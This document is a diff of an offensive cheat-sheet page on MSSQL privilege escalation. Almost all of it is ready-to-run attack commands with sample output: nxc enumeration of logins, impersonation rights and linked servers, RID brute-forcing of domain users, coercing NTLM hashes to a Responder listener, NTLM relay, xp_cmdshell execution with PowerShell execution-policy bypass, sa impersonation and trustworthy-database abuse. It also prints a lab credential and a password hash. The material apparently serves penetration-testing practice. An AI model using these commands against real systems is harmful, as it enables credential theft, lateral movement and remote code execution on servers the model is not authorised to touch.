@@ -1,9 +1,11 @@
 ---
 title: "MSSQL Privilege Escalation"
-tags: ["Hash Cracking", "Privilege Escalation", "Ntlm", "MSSQL", "Database", "Windows", "RCE", "Enum", "Domain Users", "SID", "NTLM Relay"]
+tags: ["Hash Cracking", "Privilege Escalation", "NTLM", "MSSQL", "Database", "Windows", "RCE", "Enum", "Domain Users", "SID", "NTLM Relay"]
 ---
 
-### Enum
+{{< filter_buttons >}}
+
+### Enumeration
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
@@ -11,20 +13,65 @@ tags: ["Hash Cracking", "Privilege Escalation", "Ntlm", "MSSQL", "Database", "Wi
 
 #### 1. Check Privesc Path
 
-```console
-# Local auth
-nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M mssql_priv
+```console {class="password"}
+# Password
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M mssql_priv
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M mssql_priv
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M mssql_priv
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M mssql_priv
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M mssql_priv
 ```
 
 ```console
-# Domain
-nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M mssql_priv
+# Local Auth
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M mssql_priv
 ```
 
 #### 2. List Users that Can be Impersonated
 
+```console {class="password"}
+# Password
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M enum_impersonate
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M enum_impersonate
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M enum_impersonate
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M enum_impersonate
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M enum_impersonate
+```
+
 ```console
-# Local auth
+# Local Auth
 nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_impersonate
 ```
 
@@ -35,15 +82,35 @@ MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4Fywl
 ENUM_IMP... 10.129.254.242  1433   DC               [-] No users with impersonation rights found.
 ```
 
-```console
-# Domain
-nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M enum_impersonate
-```
-
 #### 3. Enumerate Active MSSQL Logins
 
+```console {class="password"}
+# Password
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M enum_logins
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M enum_logins
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M enum_logins
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M enum_logins
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M enum_logins
+```
+
 ```console
-# Local auth
+# Local Auth
 nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_logins
 ```
 
@@ -56,15 +123,35 @@ ENUM_LOGINS 10.129.254.242  1433   DC               [*]   - sa
 ENUM_LOGINS 10.129.254.242  1433   DC               [*]   - SQLGuest
 ```
 
-```console
-# Domain
-nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M enum_logins
-```
-
 #### 4. Enumerate Linked MSSQL Servers
 
+```console {class="password"}
+# Password
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M enum_links
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M enum_links
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M enum_links
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M enum_links
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M enum_links
+```
+
 ```console
-# Local auth
+# Local Auth
 nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_links
 ```
 
@@ -74,11 +161,6 @@ MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Buil
 MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
 ENUM_LINKS  10.129.254.242  1433   DC               [+] Linked servers found:
 ENUM_LINKS  10.129.254.242  1433   DC               [*]   - WIN-Q13O908QBPG\SQLEXPRESS
-```
-
-```console
-# Domain
-nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M enum_links
 ```
 
 {{< /tabcontent >}}
@@ -113,7 +195,7 @@ Get-SQLQuery -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Query
 {{< tab set2 tab1 >}}Linux{{< /tab >}}
 {{< tab set2 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
-{{< tab set2-1 tab1 >}}Manual{{< /tab >}}{{< tab set2-1 tab2 >}}nxc{{< /tab >}}{{< tab set2-1 tab3 >}}Metasploit{{< /tab >}}
+{{< tab set2-1 tab1 >}}manual{{< /tab >}}{{< tab set2-1 tab2 >}}nxc{{< /tab >}}{{< tab set2-1 tab3 >}}metasploit{{< /tab >}}
 {{< tabcontent set2-1 tab1 >}}
 
 #### 1. Get Domain Name
@@ -202,7 +284,33 @@ REDELEGATE\Marie.Curie
 
 #### 1. Domain Users Enum
 
+```console {class="password"}
+# Password
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --rid-brute
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> --rid-brute
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> --rid-brute
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> --rid-brute
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> --rid-brute
+```
+
 ```console
+# Local Auth
 nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth --rid-brute
 ```
 
@@ -350,7 +458,7 @@ REDELEGATE\Christine.Flanders
 
 ---
 
-### Abuse #1: Steal NTLM hash
+### Capture NTLM Hash
 
 #### 1. Start a Listener
 
@@ -364,7 +472,33 @@ sudo responder -I tun0
 {{< tab set3 tab2 >}}SQL{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
+```console {class="password"}
+# Password
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M mssql_coerce -o L=<LOCAL_IP>
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M mssql_coerce -o L=<LOCAL_IP>
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M mssql_coerce -o L=<LOCAL_IP>
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M mssql_coerce -o L=<LOCAL_IP>
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M mssql_coerce -o L=<LOCAL_IP>
+```
+
 ```console
+# Local Auth
 nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M mssql_coerce -o L=<LOCAL_IP>
 ```
 
@@ -397,16 +531,57 @@ SELECT * FROM sys.dm_os_file_exists('\\<LOCAL_IP>\any\thing')
 
 ---
 
-### Abuse #2: NTLM Relay Attack
+### NTLM Relay Attack
 
 #### 1. Check if SMB Signing is False
 
-```console
+```console {class="password"}
+# Password
 nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>
 ```
 
 ```console {class="sample-code"}
-$ nxc smb MS01.example.com -u 'dev01' -p 'Initial123' -d example.com
+$ nxc smb MS01.example.com -u 'apple.seed' -p 'Password123!' -d example.com
+SMB         10.10.132.54    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:example.com) (signing:False) (SMBv1:False)
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc smb <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN>
+```
+
+```console {class="sample-code"}
+$ nxc smb MS01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d example.com
+SMB         10.10.132.54    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:example.com) (signing:False) (SMBv1:False)
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC>
+```
+
+```console {class="sample-code"}
+$ nxc smb MS01.example.com -u 'apple.seed' -p 'Password123!' -d example.com -k --kdcHost dc01.example.com
+SMB         10.10.132.54    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:example.com) (signing:False) (SMBv1:False)
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc smb <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC>
+```
+
+```console {class="sample-code"}
+$ nxc smb MS01.example.com -u 'apple.seed' -H '2B576ACBE6BCFDA7294D6BD18041B8FE' -d example.com -k --kdcHost dc01.example.com
+SMB         10.10.132.54    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:example.com) (signing:False) (SMBv1:False)
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc smb <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC>
+```
+
+```console {class="sample-code"}
+$ nxc smb MS01.example.com -u 'apple.seed' -d example.com -k --use-kcache --kdcHost dc01.example.com
 SMB         10.10.132.54    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:example.com) (signing:False) (SMBv1:False)
 ```
 
@@ -449,7 +624,33 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 {{< tab set4 tab2 >}}SQL{{< /tab >}}
 {{< tabcontent set4 tab1 >}}
 
+```console {class="password"}
+# Password
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M mssql_coerce -o L=<LOCAL_IP>
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M mssql_coerce -o L=<LOCAL_IP>
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M mssql_coerce -o L=<LOCAL_IP>
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M mssql_coerce -o L=<LOCAL_IP>
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M mssql_coerce -o L=<LOCAL_IP>
+```
+
 ```console
+# Local Auth
 nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M mssql_coerce -o L=<LOCAL_IP>
 ```
 
@@ -495,7 +696,7 @@ SYSVOL
 
 ---
 
-### Abuse #3: Run xp_cmdshell
+### Run xp_cmdshell
 
 #### 1. Check Any Policy Blocking xp_cmdshell \[Optional\]
 
@@ -523,7 +724,7 @@ xp_cmdshell powershell.exe -ep bypass <CMD>
 
 ---
 
-### Abuse #4: Impersonate sa to run xp_cmdshell
+### Impersonate sa to run xp_cmdshell
 
 #### 1. Add User to Sysadmin
 
@@ -565,7 +766,7 @@ execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass <CM
 
 ---
 
-### Abuse #5: Exploit DB Owner
+### Exploit DB Owner
 
 #### 1. Check Trustworthy Databases
 
@@ -640,7 +841,7 @@ EXEC xp_cmdshell '<CMD>'
 
 ---
 
-### Abuse #6: Run External Script
+### Run External Script
 
 #### 1. Run External Script (Python)
 
